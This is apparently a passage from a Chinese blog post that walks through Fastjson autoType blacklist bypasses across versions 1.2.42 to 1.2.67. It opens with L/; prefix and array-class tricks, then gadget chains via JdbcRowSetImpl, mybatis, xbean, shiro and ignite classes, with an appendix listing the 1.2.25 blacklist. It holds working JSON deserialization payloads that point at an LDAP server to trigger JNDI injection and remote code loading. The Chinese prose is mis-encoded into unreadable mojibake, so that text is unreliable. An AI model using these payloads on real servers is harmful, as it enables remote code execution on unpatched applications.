¡éªŒï¼Œå¹¶ä¸”åœ¨æ£€æµ‹åˆ°æ˜¯ä»¥<code>L</code>å¼€å¤´ï¼Œä»¥<code>;</code>ç»“å°¾çš„å…¨ç±»åæ—¶ï¼Œä¼šå…ˆå°†è¿™ä¸¤ä¸ªä¸œè¥¿åˆ æ‰ï¼Œç„¶ååœ¨è¿›è¡Œé»‘åå•çš„åˆ¤æ–­ï¼Œé»‘åå•æ ¡éªŒé€šè¿‡ä¹‹åè¿›å…¥<code>TypeUtils.loadClass()</code>è¿›è¡Œç±»åŠ è½½ï¼Œåœ¨ç±»åŠ è½½æ—¶ï¼Œå¦‚æœå­˜åœ¨å¤šä¸ªL ; ä¼šé€’å½’åˆ é™¤ï¼Œæ‰€ä»¥å€’ä¸ç”¨æ‹…å¿ƒå¤šå‡ºæ¥çš„<code>L</code>æˆ–<code>;</code>ä¼šå½±å“ç±»åŠ è½½</p><p><img src="/2022/11/19/FastjsonBypass/31.png"></p><p>æ¥ä¸€ä¸ªåŒå†™ç»•è¿‡å°±å¥½äº†ï¼Œå¹¶ä¸”è¿™é‡Œå¹¶æ²¡æœ‰å¯¹æ•°ç»„ç±»é‚£é‡Œè¿›è¡Œæ“ä½œï¼Œæ‰€ä»¥æ•°ç»„çš„å†™æ³•è¿˜æ˜¯èƒ½ç”¨çš„</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;\<span class="hljs-attr">&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap:xxx\&quot;,\&quot;AutoCommit\&quot;:\&quot;true\&quot;&#125;</span><br><span class="hljs-attr">&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;\&quot;dataSourceName\&quot;:\&quot;ldap:xxx\&quot;,\&quot;AutoCommit\&quot;:\&quot;true\&quot;&#125;]&#125;</span><br><span class="hljs-attr">// å¤šä¸ªL ;</span><br><span class="hljs-attr">&#123;\&quot;@type\&quot;:\&quot;LLLLcom.sun.rowset.JdbcRowSetImpl;;;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap:x\&quot;,\&quot;AutoCommit\&quot;:\&quot;true\&quot;&#125;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/11/19/FastjsonBypass/32.png"></p><h4 id="1-2-43"><a href="#1-2-43" class="headerlink" title="1.2.43"></a>1.2.43</h4><p>è¿™é‡Œï¼Œè‹¥æ˜¯å…¨ç±»åçš„ç¬¬ä¸€ç¬¬äºŒä¸ªå­—ç¬¦æ˜¯Lï¼Œé‚£å°±ç›´æ¥æŠ›å¼‚å¸¸</p><p><img src="/2022/11/19/FastjsonBypass/33.png"></p><p>æ‰€ä»¥<code>L</code>,<code>;</code>è¿™æ¡è·¯èµ°ä¸é€šäº†ï¼Œç”¨æ•°ç»„ç±»çš„é‚£ä¸ªpocå°±okäº†ï¼Œå†™pocçš„æ—¶å€™éœ€è¦æ³¨æ„<code>dataSourceName</code>å‰çš„é‚£ä¸ªé€—å·</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;\<span class="hljs-attr">&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;\&quot;dataSourceName\&quot;:\&quot;ldap:xxx\&quot;,\&quot;AutoCommit\&quot;:\&quot;true\&quot;&#125;]&#125;</span><br></code></pre></td></tr></table></figure><h4 id="1-2-44-1-2-45"><a href="#1-2-44-1-2-45" class="headerlink" title="1.2.44-1.2.45"></a>1.2.44-1.2.45</h4><p>åœ¨1.2.44ç‰ˆæœ¬æ—¶ï¼Œè¿˜æ˜¯checkAutoTypeä¸­ï¼Œè¿™é‡Œå¯¹é¦–å­—ç¬¦å’Œå°¾å­—ç¬¦è¿›è¡Œäº†ä¸€ä¸‹è®¡ç®—ï¼Œç„¶åå°±ç¦äº†æŸäº›ä¸œè¥¿</p><p><img src="/2022/11/19/FastjsonBypass/34.png"></p><p>ç„¶åå°±ç»“æŸäº†L<code> </code>;<code> </code>[`   è¿™å‡ ä¸ªå­—ç¬¦ç½ªæ¶çš„ä¸€ç”Ÿäº†</p><p>ä¸è¿‡è¿™ä¸ªæ—¶å€™é»‘åå•çš„å†…å®¹è¿˜æ˜¯æ¯”è¾ƒå°‘çš„ï¼Œæ‰€ä»¥å°±å¯ä»¥æ‰¾æ‰¾é»‘åå•ä¹‹å¤–çš„ä¸€äº›ç±»ï¼Œæ¯”å¦‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.3.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>è¿™ä¸ªç±»é‡Œé¢æœ‰ä¸ª<code>lookup()</code>,å¹¶ä¸”è¿™ä¸ªç±»ä¸åœ¨é»‘åå•é‡Œé¢</p><p><img src="/2022/11/19/FastjsonBypass/35.png"></p><p>setteræ–¹æ³•æ»¡è¶³ï¼Œä¼ å…¥çš„æ˜¯ä¸€ä¸ª<code>Properties</code>ï¼Œè¿™ä¸ªç±»æ€ä¹ˆè¯´å‘¢ï¼Œä»–å…¶å®å°±ç±»ä¼¼äºæ˜¯ä¸€ç§é”®å€¼å¯¹çš„å½¢å¼ï¼Œæ‰€ä»¥ä¼ å…¥setteræ–¹æ³•çš„å€¼çš„æ—¶å€™éœ€è¦æ³¨æ„ä¸‹ï¼Œå…¶ä»–çš„å€’ä¹Ÿä¹ˆæœ‰ä»€ä¹ˆï¼Œæ³¨æ„keyæ˜¯<code>data_source</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,<span class="hljs-attr">&quot;properties&quot;</span>:&#123;<span class="hljs-attr">&quot;data_source&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:8888/pbbLLAew&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/11/19/FastjsonBypass/36.png"></p><h4 id="1-2-46-1-2-62"><a href="#1-2-46-1-2-62" class="headerlink" title="1.2.46-1.2.62"></a>1.2.46-1.2.62</h4><p><code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>è¿™ä¸ªç±»åœ¨1.2.46å°±è¢«æ‹‰é»‘äº†ï¼Œä½†è¿˜æœ‰æ–°çš„é“¾</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.xbean<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>xbean-reflect<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.7<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªåŒ…é‡Œé¢æœ‰<code>org.apache.xbean.propertyeditor.JndiConverter</code>,è¿™ä¸ªç±»é‡Œé¢æœ‰ä¸ªJNDIæ³¨å…¥</p><p><img src="/2022/11/19/FastjsonBypass/37.png"></p><p>ä½†è¿™ä¸ªæ–¹æ³•fastjsonè°ƒç”¨ä¸äº†ï¼Œéœ€è¦æ‰¾æ‰¾åœ¨å“ªé‡Œè°ƒç”¨çš„è¿™ä¸ªæ–¹æ³•</p><blockquote><p>org.apache.xbean.propertyeditor.AbstractConverter#setAsText<br>    org.apache.xbean.propertyeditor.AbstractConverter#toObject<br>        org.apache.xbean.propertyeditor.JndiConverter#toObjectImpl</p><p>å…¶ä¸­JndiConverteræ˜¯AbstractConverterçš„å­ç±»</p></blockquote><p>å†çœ‹ä¸€ä¸‹å‚æ•°çš„ä¼ é€’ï¼Œemmmï¼Œéƒ½æ˜¯é‚£ä¸ªtextï¼Œä¹Ÿæ²¡æœ‰ä»€ä¹ˆå¤ªå¤šçš„å¤„ç†</p><p><img src="/2022/11/19/FastjsonBypass/38.png"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,<span class="hljs-attr">&quot;asText&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:8888/BvdpLNnZ&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/11/19/FastjsonBypass/39.png"></p><h4 id="1-2-63-1-2-66"><a href="#1-2-63-1-2-66" class="headerlink" title="1.2.63-1.2.66"></a>1.2.63-1.2.66</h4><p><code>org.apache.xbean.propertyeditor.JndiConverter</code>è¿™ä¸ªç±»è¢«æ‹‰é»‘äº†ï¼Œç„¶ååˆæ˜¯æ–°çš„åˆ©ç”¨é“¾</p><p>æ¯”å¦‚ï¼š<code>org.apache.shiro.realm.jndi.JndiRealmFactory</code>ï¼Œå½“ç„¶ç½‘ä¸Šè¿˜æœ‰ä¸€å †å…¶ä»–çš„é“¾å­ï¼Œæœé›†æœé›†æ‰¾æ‰¾å°±èƒ½ç”¨äº†</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.shiro<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>shiro-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/11/19/FastjsonBypass/40.png"></p><p>è¯¥getteræ–¹æ³•è¿”å›çš„æ˜¯Collectionï¼Œæ‰€ä»¥è¯¥getæ–¹æ³•ä¹Ÿæ˜¯å¯ä»¥è°ƒç”¨çš„</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;</span>,<span class="hljs-attr">&quot;jndiNames&quot;</span>:[<span class="hljs-string">&quot;ldap://127.0.0.1:8888/BvdpLNnZ&quot;</span>],<span class="hljs-attr">&quot;realms&quot;</span>:<span class="hljs-string">&quot;[]&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/11/19/FastjsonBypass/41.png"></p><h4 id="1-2-67"><a href="#1-2-67" class="headerlink" title="1.2.67"></a>1.2.67</h4><p>ä¹Ÿæ˜¯ä¸€æ¡ä¸åœ¨é»‘åå•ä¸­çš„é“¾å­<code>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.shiro<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>shiro-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/11/19/FastjsonBypass/42.png"></p><p>é“¾å­å¾ˆç®€å•ï¼Œå”¯ä¸€éœ€è¦æ³¨æ„çš„å°±æ˜¯æœ€åè°ƒç”¨<code>getTm()</code>æ–¹æ³•</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span>,<br>  <span class="hljs-attr">&quot;JndiNames&quot;</span>: [<br>    <span class="hljs-string">&quot;ldap://127.0.0.1:8888/BvdpLNnZ&quot;</span><br>  ],<br>  <span class="hljs-attr">&quot;$ref&quot;</span>: <span class="hljs-string">&quot;$.Tm&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/11/19/FastjsonBypass/43.png"></p><h4 id="å°ç»“-1"><a href="#å°ç»“-1" class="headerlink" title="å°ç»“"></a>å°ç»“</h4><p>å¼€å§‹AutoTypeæ—¶ï¼ŒåŸºæœ¬ä¸Šä¹Ÿå°±æ˜¯ç»•è¿‡é»‘åå•ï¼Œæ‰¾ä¸€æ¡ä¸åœ¨é»‘åå•é‡Œé¢çš„é“¾å­ï¼Œç„¶åå†è¢«ç¦ï¼Œå†æ‰¾ã€‚ã€‚ã€‚å¾ªç¯å¾€å¤</p><h3 id="0x03-é™„å½•"><a href="#0x03-é™„å½•" class="headerlink" title="0x03 é™„å½•"></a>0x03 é™„å½•</h3><h4 id="é»‘åå•"><a href="#é»‘åå•" class="headerlink" title="é»‘åå•"></a>é»‘åå•</h4><p>é»‘åå•ï¼šé»‘åå•åœ¨1.2.25ç‰ˆæœ¬ä¹‹å‰å·²ç»å­˜åœ¨ï¼Œåªæ˜¯å½“æ—¶åªå­˜åœ¨<code>java.lang.çº¿ç¨‹</code>ç›¸å…³çš„ç±»ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯ä¸ºäº†é˜²æ­¢å½±å“æ•ˆç‡ç”¨çš„å§ï¼Œåœ¨1.2.24çˆ†å‡ºæ¼æ´ä¹‹åï¼Œfastjsonåœ¨1.2.25ç‰ˆæœ¬æ—¶ï¼Œå°†ä¸€äº›å®˜æ–¹è®¤ä¸ºæ¯”è¾ƒå±é™©çš„ç±»éƒ½æ·»åŠ è¿›å»äº†ï¼Œå¯¹äºé»‘åå•ä¹‹ä¸­çš„ç±»ï¼Œfastjsonä¼šçˆ†å‡ºå¼‚å¸¸<code>autotype is no suppert</code>ï¼Œä¾‹å¦‚ä¸‹å›¾å½¢å¼ï¼š</p><p><img src="/2022/11/19/FastjsonBypass/1.png"></p><p>è¿™é‡Œå°†1.2.25é»‘åå•åˆ—å‡ºäº†ï¼Œå…¶ä½™çš„é»‘åå•å¯ä»¥å‚è€ƒ<a href>è¿™é‡Œ</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java">bsh,com.mchange<br>com.sun.<br>java.lang.Thread<br>java.net.Socket<br>java.rmi<br>javax.xml<br>org.apache.bcel<br>org.apache.commons.beanutils<br>org.apache.commons.collections.Transformer<br>org.apache.commons.collections.functors<br>org.apache.commons.collections4.comparators<br>org.apache.commons.fileupload<br>org.apache.myfaces.context.servlet<br>org.apache.tomcat<br>org.apache.wicket.util<br>org.codehaus.groovy.runtime<br>org.hibernate<br>org.jboss<br>org.mozilla.javascript<br>org.python.core<br>org.springframework<span class="hljs-comment">// 1.2.25</span><br></code></pre></td></tr></table></figure><h4 id="ç¼“å­˜è¡¨"><a href="#ç¼“å­˜è¡¨" class="headerlink" title="ç¼“å­˜è¡¨"></a>ç¼“å­˜è¡¨</h4><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs java">mappings.put(<span class="hljs-string">&quot;byte&quot;</span>, <span class="hljs-keyword">byte</span>.class);<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;short&quot;</span>, <span class="hljs-keyword">short</span>.class);<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;int&quot;</span>, <span class="hljs-keyword">int</span>.class);<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;long&quot;</span>, <span class="hljs-keyword">long</span>.class);<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;float&quot;</span>, <span class="hljs-keyword">float</span>.class);<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;double&quot;</span>, <span class="hljs-keyword">double</span>.class);<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;boolean&quot;</span>, <span class="hljs-keyword">boolean</span>.class);<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;char&quot;</span>, <span class="hljs-keyword">char</span>.class);<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;[byte&quot;</span>, <span class="hljs-keyword">byte</span>[].class);<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;[short&quot;</span>, <span class="hljs-keyword">short</span>[].class);<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;[int&quot;</span>, <span class="hljs-keyword">int</span>[].class);<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;[long&quot;</span>, <span class="hljs-keyword">long</span>[].class);<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;[float&quot;</span>, <span class="hljs-keyword">float</span>[].class);<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;[double&quot;</span>, <span class="hljs-keyword">double</span>[].class);<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;[boolean&quot;</span>, <span class="hljs-keyword">boolean</span>[].class);<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;[char&quot;</span>, <span class="hljs-keyword">char</span>[].class);<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;[B&quot;</span>, <span class="hljs-keyword">byte</span>[].class);<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;[S&quot;</span>, <span class="hljs-keyword">short</span>[].class);<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;[I&quot;</span>, <span class="hljs-keyword">int</span>[].class);<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;[J&quot;</span>, <span class="hljs-keyword">long</span>[].class);<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;[F&quot;</span>, <span class="hljs-keyword">float</span>[].class);<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;[D&quot;</span>, <span class="hljs-keyword">double</span>[].class);<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;[C&quot;</span>, <span class="hljs-keyword">char</span>[].class);<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;[Z&quot;</span>, <span class="hljs-keyword">boolean</span>[].class);<span class="hljs-comment">// 1.2.25</span><br>Object.class,<span class="hljs-comment">// 1.2.25</span><br>java.lang.Cloneable.class,<span class="hljs-comment">// 1.2.25</span><br>loadClass(<span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>),<span class="hljs-comment">// 1.2.25</span><br>java.lang.Exception.class,<span class="hljs-comment">// 1.2.25</span><br>java.lang.RuntimeException.class,<span class="hljs-comment">// 1.2.25</span><br>java.lang.IllegalAccessError.class,<span class="hljs-comment">// 1.2.25</span><br>java.lang.IllegalAccessException.class,<span class="hljs-comment">// 1.2.25</span><br>java.lang.IllegalArgumentException.class,<span class="hljs-comment">// 1.2.25</span><br>java.lang.IllegalMonitorStateException.class,<span class="hljs-comment">// 1.2.25</span><br>java.lang.IllegalStateException.class,<span class="hljs-comment">// 1.2.25</span><br>java.lang.IllegalThreadStateException.class,<span class="hljs-comment">// 1.2.25</span><br>java.lang.IndexOutOfBoundsException.class,<span class="hljs-comment">// 1.2.25</span><br>java.lang.InstantiationError.class,<span class="hljs-comment">// 1.2.25</span><br>java.lang.InstantiationException.class,<span class="hljs-comment">// 1.2.25</span><br>java.lang.InternalError.class,<span class="hljs-comment">// 1.2.25</span><br>java.lang.InterruptedException.class,<span class="hljs-comment">// 1.2.25</span><br>java.lang.LinkageError.class,<span class="hljs-comment">// 1.2.25</span><br>java.lang.NegativeArraySizeException.class,<span class="hljs-comment">// 1.2.25</span><br>java.lang.NoClassDefFoundError.class,<span class="hljs-comment">// 1.2.25</span><br>java.lang.NoSuchFieldError.class,<span class="hljs-comment">// 1.2.25</span><br>java.lang.NoSuchFieldException.class,<span class="hljs-comment">// 1.2.25</span><br>java.lang.NoSuchMethodError.class,<span class="hljs-comment">// 1.2.25</span><br>java.lang.NoSuchMethodException.class,<span class="hljs-comment">// 1.2.25</span><br>java.lang.NullPointerException.class,<span class="hljs-comment">// 1.2.25</span><br>java.lang.NumberFormatException.class,<span class="hljs-comment">// 1.2.25</span><br>java.lang.OutOfMemoryError.class,<span class="hljs-comment">// 1.2.25</span><br>java.lang.SecurityException.class,<span class="hljs-comment">// 1.2.25</span><br>java.lang.StackOverflowError.class,<span class="hljs-comment">// 1.2.25</span><br>java.lang.StringIndexOutOfBoundsException.class,<span class="hljs-comment">// 1.2.25</span><br>java.lang.TypeNotPresentException.class,<span class="hljs-comment">// 1.2.25</span><br>java.lang.VerifyError.class,<span class="hljs-comment">// 1.2.25</span><br>java.lang.StackTraceElement.class,<span class="hljs-comment">// 1.2.25</span><br>java.util.HashMap.class,<span class="hljs-comment">// 1.2.25</span><br>java.util.Hashtable.class,<span class="hljs-comment">// 1.2.25</span><br>java.util.TreeMap.class,<span class="hljs-comment">// 1.2.25</span><br>java.util.IdentityHashMap.class,<span class="hljs-comment">// 1.2.25</span><br>java.util.WeakHashMap.class,<span class="hljs-comment">// 1.2.25</span><br>java.util.LinkedHashMap.class,<span class="hljs-comment">// 1.2.25</span><br>java.util.HashSet.class,<span class="hljs-comment">// 1.2.25</span><br>java.util.LinkedHashSet.class,<span class="hljs-comment">// 1.2.25</span><br>java.util.TreeSet.class,<span class="hljs-comment">// 1.2.25</span><br>java.util.concurrent.TimeUnit.class,<span class="hljs-comment">// 1.2.25</span><br>java.util.concurrent.ConcurrentHashMap.class,<span class="hljs-comment">// 1.2.25</span><br>loadClass(<span class="hljs-string">&quot;java.util.concurrent.ConcurrentSkipListMap&quot;</span>),<span class="hljs-comment">// 1.2.25</span><br>loadClass(<span class="hljs-string">&quot;java.util.concurrent.ConcurrentSkipListSet&quot;</span>),<span class="hljs-comment">// 1.2.25</span><br>java.util.concurrent.atomic.AtomicInteger.class,<span class="hljs-comment">// 1.2.25</span><br>java.util.concurrent.atomic.AtomicLong.class,<span class="hljs-comment">// 1.2.25</span><br>java.util.Collections.EMPTY_MAP.getClass(),<span class="hljs-comment">// 1.2.25</span><br>java.util.BitSet.class,<span class="hljs-comment">// 1.2.25</span><br>java.util.Calendar.class,<span class="hljs-comment">// 1.2.25</span><br>java.util.Date.class,<span class="hljs-comment">// 1.2.25</span><br>java.util.Locale.class,<span class="hljs-comment">// 1.2.25</span><br>java.util.UUID.class,<span class="hljs-comment">// 1.2.25</span><br>java.sql.Time.class,<span class="hljs-comment">// 1.2.25</span><br>java.sql.Date.class,<span class="hljs-comment">// 1.2.25</span><br>java.sql.Timestamp.class,<span class="hljs-comment">// 1.2.25</span><br>java.text.SimpleDateFormat.class,<span class="hljs-comment">// 1.2.25</span><br>com.alibaba.fastjson.JSONObject.class,<span class="hljs-comment">// 1.2.25</span><br>loadClass(<span class="hljs-string">&quot;java.awt.Rectangle&quot;</span>),<span class="hljs-comment">// 1.2.25</span><br>loadClass(<span class="hljs-string">&quot;java.awt.Point&quot;</span>),<span class="hljs-comment">// 1.2.25</span><br>loadClass(<span class="hljs-string">&quot;java.awt.Font&quot;</span>),<span class="hljs-comment">// 1.2.25</span><br>loadClass(<span class="hljs-string">&quot;java.awt.Color&quot;</span>),<span class="hljs-comment">// 1.2.25</span><br></code></pre></td></tr></table></figure></blockquote><h4 id="ååºåˆ—åŒ–å™¨"><a href="#ååºåˆ—åŒ–å™¨" class="headerlink" title="ååºåˆ—åŒ–å™¨"></a>ååºåˆ—åŒ–å™¨</h4><p>ååºåˆ—åŒ–å™¨çš„ä½œç”¨æ˜¯ï¼šå¯¹äºä¸€äº›ç±»ï¼Œä½¿ç”¨ç¡®å®šçš„ååºåˆ—åŒ–å™¨ï¼Œæ¯”å¦‚<code>SimpleDateFormat.class</code>ä½¿ç”¨MiscCodeååºåˆ—å™¨</p><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 